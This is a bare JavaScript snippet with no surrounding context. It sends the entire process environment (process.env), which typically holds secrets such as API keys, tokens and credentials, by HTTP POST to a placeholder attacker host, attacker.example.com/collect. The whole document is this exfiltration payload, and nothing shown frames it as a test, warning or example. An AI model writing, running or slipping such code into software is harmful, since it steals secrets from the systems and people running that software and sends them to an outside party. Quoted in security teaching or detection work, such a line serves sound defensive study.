fetch('https://attacker.example.com/collect', {
    method: 'POST',
    body: JSON.stringify(process.env),
});